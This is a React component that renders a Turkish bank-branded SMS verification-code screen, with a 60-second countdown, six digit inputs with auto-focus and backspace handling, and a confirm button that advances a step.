import React, { useEffect, useState } from 'react';
import './style.css';

function OTP(props) {
  const [counter, setCounter] = useState(60);
  const num = '[0-9]*';
  let otpFields = [];

  useEffect(() => {
    counter > 0 && setTimeout(() => setCounter(counter - 1), 1000);
  }, [counter]);

  const editOTP = (e, i) => {
    if(typeof otpFields[i+1] !== 'undefined') {
      otpFields[i+1].value = '';
      otpFields[i+1].focus();
    }
  }

  const backSpace = (e, i) => {
    if (e.keyCode === 8 && typeof otpFields[i-1] !== 'undefined') {
      otpFields[i-1].value = '';
      otpFields[i-1].focus();
    }
  }

  const onInput = (e, i) => {
    e.target.value = Math.max(0, parseInt(e.target.value) ).toString().slice(0,1)
  }

  return (
    <div className={'otp-area'}>
      <div className={'countdown'}>{counter} saniye</div>
      <div className={'otp-contents'}>
        <div className={'otp-head'}>
          <img alt={'logo'} src={'./assets/banks/garanti.png'} />
          <p>SMS Onay Kodu</p>
        </div>
        <div className={'otp-form'}>
          <input type={'number'} inputMode='numeric' pattern={num} onChange={(e) => editOTP(e, 0)} onInput={onInput} onKeyUp={(e) => backSpace(e, 0)} ref={(input) => { otpFields[0] = input; }} placeholder={'_'} />
          <input type={'number'} inputMode='numeric' pattern={num} onChange={(e) => editOTP(e, 1)} onInput={onInput} onKeyUp={(e) => backSpace(e, 1)} ref={(input) => { otpFields[1] = input; }} placeholder={'_'} />
          <input type={'number'} inputMode='numeric' pattern={num} onChange={(e) => editOTP(e, 2)} onInput={onInput} onKeyUp={(e) => backSpace(e, 2)} ref={(input) => { otpFields[2] = input; }} placeholder={'_'} />
          <input type={'number'} inputMode='numeric' pattern={num} onChange={(e) => editOTP(e, 3)} onInput={onInput} onKeyUp={(e) => backSpace(e, 3)} ref={(input) => { otpFields[3] = input; }} placeholder={'_'} />
          <input type={'number'} inputMode='numeric' pattern={num} onChange={(e) => editOTP(e, 4)} onInput={onInput} onKeyUp={(e) => backSpace(e, 4)} ref={(input) => { otpFields[4] = input; }} placeholder={'_'} />
          <input type={'number'} inputMode='numeric' pattern={num} onChange={(e) => editOTP(e, 5)} onInput={onInput} onKeyUp={(e) => backSpace(e, 5)} ref={(input) => { otpFields[5] = input; }} placeholder={'_'} />
        </div>
        <p className={'bank-extra-info'}>İşleminize devam edebilmek için bankanıza tanımlı olan numaraya
        gelen onay kodunu giriniz. Ardından “Onayla” butonuna tıklayarak,
işlemi gönderin.</p>
        <button onClick={() => props.stepHandler()} className={'start-process-btn'}>Onayla</button>
      </div>
    </div>
  );
}

export default OTP;